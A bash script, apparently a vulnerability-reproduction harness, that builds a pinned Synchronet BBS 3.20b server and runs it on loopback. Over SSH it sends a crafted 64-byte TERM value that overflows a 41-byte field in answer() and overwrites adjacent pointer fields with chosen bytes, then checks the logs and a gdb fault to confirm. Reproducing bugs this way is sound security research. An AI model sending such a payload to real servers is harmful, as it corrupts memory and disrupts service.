#!/usr/bin/env bash
# W21: real shipped 3.20b sbbs3 build + loopback SSH pty-req TERM -> answer().
# Instrumentation-only probe reads savedlines.first/.last at sbbs_t+48/+56
# immediately after the verbatim no-size copy. Author evidence only; no
# external probes (all clients to 127.0.0.1); witness replay still owed.
set -euo pipefail
cd "$(dirname "$0")/../../.."
HERE=$PWD
TREE=$HERE/src-tree/320b
P=$HERE/provision
PARENT=db9c5d6fd37ef74b6e6ca647308d351e656de18d
MIRROR=https://github.com/SynchronetBBS/sbbs.git
DEBS="zip libarchive-dev libnspr4-dev autoconf2.13"
pass=0
fail=0
note() { echo "REAL_320B $*"; }
expect() {
    local file=$1 pattern=$2 label=$3
    if grep -qE "$pattern" "$file"; then
        echo "PASS $label"
        pass=$((pass + 1))
    else
        echo "FAIL $label (missing: $pattern in $file)"
        fail=$((fail + 1))
    fi
}

# 1. Provision an exact pinned tree if this lab has none.
if [ ! -e "$TREE/.git" ]; then
    note "cloning pinned parent $PARENT"
    git clone --no-checkout "$MIRROR" "$TREE"
    git -C "$TREE" checkout --detach "$PARENT"
fi
test "$(git -C "$TREE" rev-parse HEAD)" = "$PARENT" || {
    echo "TREE_HEAD_MISMATCH"; exit 2;
}

# 2. Provision build-only tools/headers into the lab prefix (no host packages).
mkdir -p "$P/debs" "$P/local" "$HERE/release-label/term320b/real320b/evidence" || exit 2
(cd "$P/debs" && for d in $DEBS; do test -f "${d}_"*.deb || apt-get download "$d"; done)
for d in "$P"/debs/*.deb; do dpkg-deb -x "$d" "$P/local"; done
L=$P/local/usr/lib/x86_64-linux-gnu
ln -sf autoconf2.13 "$P/local/usr/bin/autoconf-2.13"
ln -sf /usr/lib/x86_64-linux-gnu/libacl.so.1 "$L/libacl.so"
export PATH="$P/local/usr/bin:$PATH"
export AC_MACRODIR="$P/local/usr/share/autoconf2.13"
export PKG_CONFIG_PATH="$L/pkgconfig${PKG_CONFIG_PATH:+:$PKG_CONFIG_PATH}"
cleanup_stale() {
    pkill -9 -f "$TREE/src/sbbs3/gcc.linux.x64.exe.debug/sbbs nd nh nj ne" 2>/dev/null || true
    sleep 1
}
cleanup_stale
export CPATH="$P/local/usr/include:$P/local/usr/include/nspr${CPATH:+:$CPATH}"
export LIBRARY_PATH="$L${LIBRARY_PATH:+:$LIBRARY_PATH}"
export LD_LIBRARY_PATH="$L${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"
FLIBS="-L$L -larchive -lnettle -lacl -llzma -lzstd -llz4 -lbz2 -lz -lxml2"

# 3. Loopback SSH-only config; other services disabled.
HN=$(hostname)
INI="$TREE/ctrl/sbbs.$HN.ini"
write_ini() {
    local port=$1
    cat > "$INI" <<EOF
; W5 lab-only loopback SSH config for real sbbs3 run (gitignored tree)
[Global]
	Hostname =
	Interface = 127.0.0.1
	OutboundInterface = 127.0.0.1
	TempDirectory =
	LogLevel = Debugging
	TLSErrorLevel = Debugging

[BBS]
	AutoStart = true
	SSHInterface = 127.0.0.1
	SSHErrorLevel = Debugging
	SSHPort = $port
	SSHConnectTimeout = 10s
	FirstNode = 1
	LastNode = 4
	Options = XTRN_MINIMIZED | ALLOW_SSH | SSH_ANYAUTH | NO_TELNET | NO_HOST_LOOKUP | NO_EVENTS

[Mail]
	AutoStart = false

[FTP]
	AutoStart = false

[Web]
	AutoStart = false

[Services]
	AutoStart = false

[UNIX]
	Daemonize = False
	PidFile = sbbs-w5.pid
	LogFacility = User
	LogIdent = synchronet-w5
	umask = 077
EOF
}
PORT=$((23000 + $$ % 1000))
write_ini "$PORT"

build() {
    cleanup_stale
    make -C "$TREE/3rdp/build" jslib > "$P/jslib-w5.log" 2>&1 || return 1
    make -C "$TREE/src/sbbs3" FILE_LIBS="$FLIBS" > "$P/build-w5.log" 2>&1 || return 1
}

run_case() {
    # $1 = TERM value, $2 = client log, $3 = seconds of streamed stdin
    local term=$1 out=$2 secs=$3 i
    (for i in $(seq 1 $((secs / 2))); do echo x; sleep 0.2; done) | \
      TERM="$term" timeout $((secs + 4)) ssh -tt \
        -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        -o PreferredAuthentications=none -o PubkeyAuthentication=no \
        -o PasswordAuthentication=no -o KbdInteractiveAuthentication=no \
        -o HostKeyAlgorithms=+ssh-rsa -o ConnectTimeout=5 \
        -p "$PORT" lab@127.0.0.1 > "$out" 2>&1 || true
}

start_server() {
    local log=$1
    wait_port_free || return 1
    (cd "$TREE" && SBBSCTRL="$TREE/ctrl" "$TREE/src/sbbs3/gcc.linux.x64.exe.debug/sbbs" \
        nd nh nj ne > "$log" 2>&1) &
    SPID=$!
    for i in $(seq 1 60); do
        grep -q 'SSH Server listening' "$log" && return 0
        sleep 0.5
    done
    echo "SERVER_START_TIMEOUT"; return 1
}
wait_port_free() {
    for i in $(seq 1 40); do
        ss -ltn 2>/dev/null | grep -q ":$PORT " || return 0
        cleanup_stale
        sleep 0.5
    done
    echo "PORT_BUSY"; return 1
}
stop_server() {
    [ -n "${SPID:-}" ] && kill -TERM "$SPID" 2>/dev/null || true
    [ -n "${SPID:-}" ] && wait "$SPID" 2>/dev/null || true
    pkill -9 -f "$TREE/src/sbbs3/gcc.linux.x64.exe.debug/sbbs nd nh nj ne" 2>/dev/null || true
    sleep 1
    SPID=
}
trap stop_server EXIT

E=$HERE/release-label/term320b/real320b/evidence
CHOSEN="$(printf 'A%.0s' $(seq 1 41))$(printf 'B%.0s' $(seq 1 3))MISHE-OOTAUFTAUF$(printf 'Z%.0s' $(seq 1 4))"
CONTROL="$(printf 'A%.0s' $(seq 1 40))"

# 4. Control first in a clean server: 40-byte TERM leaves fields untouched.
git -C "$TREE" checkout -- src/sbbs3/answer.cpp
(cd "$TREE" && patch -p1 < "$HERE/release-label/term320b/real320b/probe-320b.patch") || exit 3
build || { echo "BUILD_FAILED_VULN"; exit 4; }
start_server "$E/server-control40.log"
run_case "$CONTROL" "$E/client-control40.log" 6
stop_server
expect "$E/server-control40.log" 'REAL_320B_PROBE sizeof=41 l=40 off41=00 cv=00000000' 'real 3.20b answer(): 40-byte control leaves adjacent fields zero'

# 5. Chosen 64-byte TERM in a fresh server on a fresh port (avoid TIME_WAIT).
PORT=$((PORT + 1))
write_ini "$PORT"
start_server "$E/server-vuln.log"
run_case "$CHOSEN" "$E/client-vuln-chosen64.log" 8
stop_server
cp "$E/server-vuln.log" "$E/server-vuln-final.log"
expect "$E/server-vuln.log" 'REAL_320B_PROBE sizeof=41 l=64 off41=42 cv=4853494d first=0x465541544f4f2d45 last=0x5a5a5a5a46554154' 'real 3.20b answer(): chosen MISH at +44, E-OO/TAUF at +48, TAUF/ZZZZ at +56'
expect "$E/server-vuln.log" 'Node 1 destructor begin' 'chosen TERM session reached sbbs_t teardown'
if [ -f "$E/gdb-vuln-final.log" ]; then
    expect "$E/gdb-vuln-final.log" 'listFreeNodes \(list=' 'gdb fault frame is the chosen-pointer consumer'
fi

echo "RESULT: PASS=$pass FAIL=$fail"
git -C "$TREE" checkout -- src/sbbs3/answer.cpp
test "$fail" -eq 0
